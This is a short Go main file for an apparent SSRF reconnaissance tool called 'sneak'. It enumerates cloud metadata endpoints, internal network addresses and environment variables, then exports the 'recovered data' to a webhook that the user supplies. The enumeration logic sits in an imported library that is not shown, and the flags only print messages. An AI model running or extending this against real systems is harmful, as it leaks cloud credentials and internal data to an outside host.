package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/ex0dus-0x/sneak"
)

var (
	// Disables specific SSRF checks
	noCloud = flag.Bool("no-cloud", false, "Disables enumerating for cloud metadata endpoints")
	noNet   = flag.Bool("no-net", false, "Disables enumerating environment for internal network endpoints")
	noEnv   = flag.Bool("no-env", false, "Disables enumerating envvars for internal endpoints")

	cloudMeta = flag.String("cloud", "", "Sets a specific cloud provider to do SSRF checks for")
	webhook   = flag.String("webook", "", "Webhook endpoint to retrieve recovered data")
	help      = flag.Bool("help", false, "display this help screen")
)

func main() {
	flag.Parse()
	if *help {
		flag.Usage()
		os.Exit(0)
	}

	enum := sneak.StartEnum()
	if !*noCloud {
		fmt.Println("Enumerating cloud")
	}
	if !*noNet {
		fmt.Println("Enumerating net")
	}
	if !*noEnv {
		fmt.Println("Enumerating envs")
	}
	enum.Export(webhook)
}
